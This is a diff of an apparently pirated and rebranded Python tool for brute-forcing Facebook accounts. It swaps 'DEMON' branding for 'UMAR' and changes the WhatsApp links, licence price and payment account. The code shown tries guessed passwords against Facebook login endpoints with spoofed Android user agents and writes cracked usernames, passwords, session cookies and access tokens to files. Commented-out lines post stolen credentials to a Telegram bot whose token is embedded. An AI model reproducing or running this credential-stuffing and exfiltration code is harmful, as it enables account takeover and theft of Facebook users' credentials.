@@ -108,7 +108,7 @@ prox=open('.prox.txt','r').read().splitlines()
 
 def p(x):
 	print(x)
-os.system(f'xdg-open https://chat.whatsapp.com/D3Xd6IztOyi9Jg53G98Cjx')
+os.system(f'xdg-open https://chat.whatsapp.com/LEwEq6tHVjM7wnW33DNfQb')
 	
 
 #___________ [ Lists Used in Script]________
@@ -129,7 +129,10 @@ for mo in range(300):
 	colour = f"\33[38;5;{mo+1}m"
 def logo():
 	os.system('clear')
-	logo = (f'''{colour}______             __                           
+	logo= ("""\33[;33m   
+         
+\033[92m
+  ______             __                           
  /      \           /  |                          
 /$$$$$$  | __    __ $$ |____    ______    ______  
 $$ |  $$/ /  |  /  |$$      \  /      \  /      \ 
@@ -151,7 +154,8 @@ $$    $$/ $$    $$ |$$    $$/ $$       |$$ |
       \033[1;96m★彡[ɪᴍʀᴀɴ ᴋʜᴀɴ ʟᴏᴠᴇʀ]彡★\033[1;97m
 ----------------------------------------------------------------------
 OK ids will be saved in 𝙐𝙈𝘼𝙍 folder
-----------------------------------------------------------------------{colour}''')
+----------------------------------------------------------------------
+\033[1;97m""")
 	p(logo)
 def clear():
 	os.system("clear")
@@ -243,7 +247,7 @@ def buy():
 	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
 	logo()
 	line()
-	os.system('xdg-open https://chat.whatsapp.com/D3Xd6IztOyi9Jg53G98Cjx')
+	os.system('xdg-open https://chat.whatsapp.com/LEwEq6tHVjM7wnW33DNfQb')
 	print(" [•] \033[1;96mAdmin is online  \033[1;97m")
 	print(" \033[1;92m[•] Terms and Conditions Please Read Carefully\033[1;97m ")
 	print(" [•] Your Token is Not Approved ")
@@ -254,10 +258,10 @@ def buy():
 	line()
 	print(' [•] If Facebook go on update and you dont get any accounts its your headache ')
 	print(' [•] Payment method should be followed ')
-	print(" [•] ₦15,000 / 1Month  ")
-	print(" [•] Payment : First Bank")
-	print(' [•] Account Name : Nwombu David Chinedu')
-	print(' [•] Account Number : 3177639925')
+	print(" [•] 700 / 1Month  ")
+	print(" [•] Payment : Jazzcash")
+	print(' [•] Account Name : Umar Nlazeer')
+	print(' [•] Account Number : 03021431324')
 	print(" [•] Token :\033[1;95m %s"%(DEMON_token))
 	print("\033[1;97m [•] Copy & send Token to Admin to get approved ")
 	
@@ -468,7 +472,7 @@ class DEMON:
 		pwx=[]
 		logo()
 		max = 70
-		p(" [•] Example 1 , 2 , 3  to 10 to 50Max ")
+		p(" [•] How many password do you want 5 to 50Max ")
 		try:
 			plimit = int(input(" [•] Put limit : "))
 			if plimit =="":
@@ -519,7 +523,7 @@ class DEMON:
 	def method1(self,uid,nm,pwx):
 		try:
 			global ok , cp , loop
-			sys.stdout.write('\r [DEMON] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+			sys.stdout.write('\r [UMAR] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
 			android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
 			facebook_version = f'{random.randint(10,440)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
 			facebook_version2 = f'{random.randint(10,999)}.0.0.{random.randint(0,999)}'
@@ -604,7 +608,7 @@ class DEMON:
 				if "session_key" in q:
 					token = q["access_token"]
 					ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cok = f"sb={ssbb};{ckkk}"					    
-					p('\r\033[1;92m[DEMON-OK] %s | %s \033[1;97m '%(uid,pw))		
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))		
 					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
 					##requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= OK RESULT \n ====================\n √. USER   (  {uid}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {DEMON_ua}  )\n.√. .√. COOKIE   (  {cok}  )\n.√. By :- CYBER DEMON √ " )
 				    #(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
@@ -614,7 +618,7 @@ class DEMON:
 					open('/sdcard/DEMON_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					#p('\r\033[1;35m[DEMON-CP] %s | %s \033[1;97m '%(uid,pw))
+					#p('\r\033[1;35m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					##requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= CP RESULT \n ====================\n √. USER   (  {uid}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {DEMON_ua}  )\n.√.√. By :- CYBER DEMON √ " )
 					cp.append(uid)
 					open('/sdcard/DEMON_M1_CP.txt','a').write(uid+'|'+pw+'\n')
@@ -718,7 +722,7 @@ class DEMON:
 					open('/sdcard/DEMON_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;91m[DEMON-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
 					open('/sdcard/DEMON_M2_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
@@ -846,14 +850,14 @@ class DEMON:
 					token = q["access_token"]
 					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
 					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
-					p('\r\033[1;92m[DEMON-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					ok.append(uid)
 					open('/sdcard/DEMON_M3_OK.txt','a').write(uid+'|'+pw+'\n')
 					#os.system('espeak -a 300 " DEMON,  Ok,  id"')
 					open('/sdcard/DEMON_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					p('\r\033[1;35m[DEMON-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;35m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
 					open('/sdcard/DEMON_M3_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
@@ -896,14 +900,14 @@ class DEMON:
 				if "session_key" in q:
 					token = q["access_token"]
 					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-					p('\r\033[1;92m[DEMON-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
 					ok.append(uid)
 					open('/sdcard/DEMON_M4_OK.txt','a').write(uid+'|'+pw+'\n')
 					open('/sdcard/DEMON_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					#p('\r\033[1;91m[DEMON-CP] %s | %s \033[1;97m '%(uid,pw))
+					#p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
 					open('/sdcard/DEMON_M4_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
@@ -995,7 +999,7 @@ class DEMON:
 				if "session_key" in q:
 					token = q["access_token"]
 					ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cok = f"sb={ssbb};{ckkk}"					    
-					p('\r\033[1;92m[DEMON-OK] %s | %s \033[1;97m '%(uid,pw))		
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))		
 					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
 					print(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
 					print(f" [•]\033[1;96m UserAgent  : {DEMON_ua}\033[1;97m")
@@ -1005,7 +1009,7 @@ class DEMON:
 					open('/sdcard/DEMON_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					#p('\r\033[1;35m[DEMON-CP] %s | %s \033[1;97m '%(uid,pw))
+					#p('\r\033[1;35m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
 					open('/sdcard/DEMON_M5_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
@@ -1063,14 +1067,14 @@ class DEMON:
 				if "c_user" in ses.cookies.get_dict():
 					####token = response["access_token"]
 					cok = convert(ses.cookies.get_dict())
-					p('\r\033[1;92m[DEMON-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'\n')
 					ok.append(uid)
 					open('/sdcard/DEMON_M6_OK.txt','a').write(uid+'|'+pw+'\n')
 					open('/sdcard/DEMON_M6_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif "checkpoint" in po.cookies.get_dict():
-					p('\r\033[1;91m[DEMON-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
 					open('/sdcard/DEMON_M6_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
@@ -1144,7 +1148,7 @@ class DEMON:
 				if "c_user" in ses.cookies.get_dict().keys():
 					##token = q["access_token"]
 					cok = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					p('\r\033[1;92m[DEMON-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+'\n')
 					ok.append(uid)
 					open('/sdcard/DEMON_M7_OK.txt','a').write(uid+'|'+pw+'\n')
@@ -1152,7 +1156,7 @@ class DEMON:
 					#requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= OK RESULT \n ====================\n √. USER   (  {uid}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {ua}  )\n.√. .√. COOKIE   (  {cok}  )\n.√. By :- CYBER DEMON √ " )
 					break
 				elif "checkpoint" in q.cookies.get_dict().keys():
-					p('\r\033[1;91m[DEMON-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
 					open('/sdcard/DEMON_M7_CP.txt','a').write(uid+'|'+pw+'\n')
 					#requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= CP RESULT \n ====================\n √. USER   (  {uid}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {ua}  )\n.√. . By :- CYBER DEMON √ " )
@@ -1207,19 +1211,19 @@ class DEMON:
 				if "session_key" in response.text and "EAA" in response.text:
 					token = response.json()["access_token"]
 					cok = ";".join(i["name"]+"="+i["value"] for i in response.json()["session_cookies"])
-					p('\r\033[1;92m[DEMON-OK] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;92m[UMAR-OK] %s | %s \033[1;97m '%(uid,pw))
 					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
 					ok.append(uid)
 					open('/sdcard/DEMON_M8_OK.txt','a').write(uid+'|'+pw+'\n')
 					open('/sdcard/DEMON_M8_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif "www.facebook.com" in response['error']['message']:
-					p('\r\033[1;91m[DEMON-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
 					open('/sdcard/DEMON_M8_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
 				elif "User must verify their account" in response.text:
-					p('\r\033[1;91m[DEMON-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;91m[UMAR-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
 					open('/sdcard/DEMON_M8_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
@@ -1372,18 +1376,18 @@ def rd(uid,passlist):
 			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
 			if 'session_key' in po:
 				uid = str(po['uid'])
-				print(f'\r\033[1;32m [DEMON-OK] '+uid+' | '+pas+'\033[1;37m')
+				print(f'\r\033[1;32m [UMAR-OK] '+uid+' | '+pas+'\033[1;37m')
 				#os.system('espeak -a 300 " Congratulation,   Dear,  ,User,"')
 				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
 				RANA1 = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RANA1};{ckkk}"
 				print(f'\r\033[1;32m [COOKIES] :{W} '+cookie)
-				open('/sdcard/DEMON/DEMON-RNDM-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
+				open('/sdcard/UMAR/UMAR-RNDM-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
 				ok.append(uid)
 				break
 			elif 'www.facebook.com' in po['error']['message']:
 				uid = str(po['error']['error_data']['uid'])
-				print(f'\r{W} [DEMON-CP] '+uid+' | '+pas+'\033[1;37m')
-				open('/sdcard/DEMON/DEMON-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
+				print(f'\r{W} [UMAR-CP] '+uid+' | '+pas+'\033[1;37m')
+				open('/sdcard/UMAR/UMAR-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
 				cp.append(uid)
 				break
 			else:
@@ -1424,18 +1428,18 @@ def rd1(uid,passlist):
 			po = ses.post("https://graph.facebook.com/auth/login",params=params,headers=headers,allow_redirects=False)
 			if 'session_key' in po.text or "EAA" in po.text:
 				uid = str(po['uid'])
-				print(f'\r\033[1;32m [DEMON-OK] '+uid+' | '+pas+'\033[1;37m')
+				print(f'\r\033[1;32m [UMAR-OK] '+uid+' | '+pas+'\033[1;37m')
 				#os.system('espeak -a 300 " Congratulation,   Dear,  ,User,"')
 				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
 				DEM1 = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={DEM1};{ckkk}"
 				print(f'\r\033[1;32m [COOKIES] :{W} '+cookie)
-				open('/sdcard/DEMON/DEMON-RNDM-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
+				open('/sdcard/UMAR/UMAR-RNDM-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
 				ok.append(uid)
 				break
 			elif 'www.facebook.com' in po['error']['message']:
 				uid = str(po['error']['error_data']['uid'])
-				print(f'\r{W} [DEMON-CP] '+uid+' | '+pas+'\033[1;37m')
-				open('/sdcard/DEMON/DEMON-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
+				print(f'\r{W} [UMAR-CP] '+uid+' | '+pas+'\033[1;37m')
+				open('/sdcard/UMAR/UMAR-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
 				cp.append(uid)
 				break
 			else:
@@ -1453,9 +1457,9 @@ def convert(cookie):
 class Join:
 	def __init_(self):
 		logo()
-		os.system("xdg-open https://wa.me/+2348178406817")
+		os.system("xdg-open https://wa.me/+23021431324")
 	def Whatsapp(self):
-		os.system("xdg-open https://chat.whatsapp.com/D3Xd6IztOyi9Jg53G98Cjx")
+		os.system("xdg-open https://chat.whatsapp.com/LEwEq6tHVjM7wnW33DNfQb")
 		DEMON().DEMON()
 	def Facebook(self):
 		os.system('xdg-open https://www.facebook.com/100053053007337/posts/1058020211826543/?substory_index=1058020211826543&app=fbl')
